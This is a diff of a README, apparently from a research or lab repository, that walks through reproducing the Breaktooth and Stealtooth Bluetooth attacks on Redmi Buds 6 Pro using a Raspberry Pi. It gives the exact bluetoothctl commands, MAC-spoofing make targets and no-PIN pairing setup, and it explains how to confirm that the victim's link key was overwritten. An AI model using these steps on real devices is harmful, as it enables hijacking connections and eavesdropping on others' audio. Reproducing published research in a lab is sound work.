@@ -10,43 +10,49 @@ There are 2 branches, main and mallory. Changes in main are only for debugging a
 
 Paper that introduces and explains Stealtooth: https://arxiv.org/pdf/2507.00847. Stealtooth builds on top of [Breaktooth](https://eprint.iacr.org/2024/900.pdf), which source code can be downloaded on [breaktooth.github.io](https://breaktooth.github.io/).
 
-We will perform this attack on the `Redmi Buds 6 Pro`.
-
 Breaktooth exploits a vulnerability in the power savings implementation. Using this exploit, the bluetooth device accept the attacker's link key without requiring any manual user confirmation. This key then which overwrites the real link key silently, allowing to take over the connection.
 
 Stealtooth then builds on top of Breaktooth to perform a MitM attack. After overwriting the link key on both A and B, the attack can pass through audio from A to B whilst at the same time eavesdropping or injecting audio, without the victim being aware of the compromised connection.
 
 ## Implementation
 
-The first step to perform this attack is to find the device MAC address and device name:
+To show the attack, we are using a raspberry pi 3B (Mallory) and perform the attack on a linux computer (Alice) that is paired/connected to Redmi Buds 6 Pro (Bob).
+
+After connecting Alice with Bob (in our case, we open the case but leave the earbuds in the case), we can set them aside and connect to the pi.
+
+The first step is to find the MAC addresses and device names:
 
 ```
-sudo rfkill unblock bluetooth # for some reason was soft blocked on my pi
+sudo rfkill unblock bluetooth # was soft blocked after first install
 
 sudo systemctl start bluetooth
 sudo bluetoothctl
 [bluetoothctl]> power on
 [bluetoothctl]> scan on
-# power on buds
 # [NEW] Device <MAC_B> Redmi Buds 6 Pro
-# power on bluetooth on phone
-# [NEW] Device <MAC_A> <PHONE>
+# [NEW] Device <MAC_A> <NAME_A>
 [bluetoothctl]> scan off
 [bluetoothctl]> exit
 ```
 
-
 ### Breaktooth
 
-Once we have obtained the MAC_B (of the buds) and the name, we can start using the Breaktooth tool. We have slightly modified this tool as the original source code does not work (anymore). You can find the updated code in the `breaktooth` directory.
+Once we have obtained the MAC addresses and names, we can start using the Breaktooth tool. We have slightly modified this tool as the original source code does not work (anymore). You can find the updated code in the `breaktooth` directory.
 
-After downloading and unzipping, first switch to root user using `sudo su`. After that, install the dependencies using:
+Switch to the root user using `sudo su` and install depenencies using:
 ```
 make install/deps
 ```
 
+Next, we start our attack by preparing it with the correct MAC and device name
 
-Make sure we are in NoInputNoOutput mode. This indicates that mallory has no capability for user input or output during the connection and pairing process, so the victim will not ask for a pairing PIN.
+```
+go # if you get "command not found", exit and sudo su again (`$PATH` needs to be updated after installing the deps)
+source venv/bin/activate
+make setup/device MAC=<MAC_A> NAME="<NAME_A>" TARGET=<MAC_B> # spoof A and get a connection with B
+```
+
+After that we need to make sure we are in NoInputNoOutput mode. This indicates that we have no capability for user input or output during the pairing/connection process. As a result, the device we are trying to hack will not ask for a pairing PIN.
 ```
 bluetoothctl
 [bluetoothctl]> agent off
@@ -54,19 +60,14 @@ bluetoothctl
 [bluetoothctl]> default-agent
 ```
 
-Next, we start our attack by preparing it with the correct MAC and device name
-
+Lastly, we can perform our breaktooth attack by running
 ```
-go # if you get "command not found", exit and sudo su again
-source venv/bin/activate
-make setup/device MAC=<MAC_B> NAME="Redmi Buds 6 Pro" TARGET=<MAC_A>
+make breaktooth
 ```
 
-Lastly, to perform our attack we run `make breaktooth` that will continuously check the connection between A and B. As soon as the buds (B) enter power saving mode, we will send a request to the target (A) that will hijack the connection. Once the connection is hijacked (and mallory is registered as a input-keyboard device), we can run `make boot/injector` to run commands on the target.
+This will continously check the connection status between A and B. Once Alice disconnects, which can be "forced" using for example `sudo btmgmt power off` (on Alice), the script will automatically try to connect to Bob. If we did the setup/device the other way around, so we are spoofing the buds, we can disconnect by simply closing the lid.
 
-For now I have achieved running all the stuff above, but I can not get the buds to enter sleep mode. I can close the lid that seems to work, however, we then get a connection status of 111 (connection refused). This seems like it didn't properly entered in the sleep mode, but will have to investigate further.
-
-In addition, after closing the buds, somehow it seems like we actually did manage to overwrite the link key? Because once we followed the steps above, we can no longer connect A and B (but we can also not connect Mallory with either?).
+To show that the connection works, we can run `bluetoothctl info <MAC_B>` on the pi and see that Connected is true. In addition, when trying to re-connect Alice with Bob we get `org.bluez.Error.Failed br-connection-key-missing`, which indicates we have overwritten the key successfully.
 
 # BISON
 
